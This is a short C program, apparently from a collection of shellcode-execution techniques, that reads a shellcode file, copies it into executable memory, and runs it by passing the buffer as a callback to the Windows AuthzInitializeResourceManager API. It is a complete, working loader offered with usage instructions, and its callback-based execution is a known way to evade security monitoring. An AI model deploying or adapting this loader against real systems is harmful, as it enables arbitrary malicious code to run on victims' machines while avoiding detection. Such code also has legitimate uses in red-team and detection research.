// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Minimum Supported Client: Windows XP
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Authz.lib")

#include <stdio.h>
#include <windows.h>
#include <AuthZ.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	AUTHZ_RESOURCE_MANAGER_HANDLE sARMH = { 0 };
	AUTHZ_CLIENT_CONTEXT_HANDLE sACCH = { 0 };
	LUID notnecessary = { 0 };

	if (argc != 2)
	{
		printf("Usage: AuthzInitializeResourceManager.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);
	
	AuthzInitializeResourceManager(AUTHZ_RM_FLAG_NO_AUDIT, NULL,
		(PFN_AUTHZ_COMPUTE_DYNAMIC_GROUPS)hAlloc, NULL, NULL, &sARMH);

	AuthzInitializeContextFromToken(0, GetCurrentProcessToken(), sARMH, NULL, notnecessary, NULL, &sACCH);
	
	AuthzFreeContext(sACCH);
	AuthzFreeResourceManager(sARMH);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}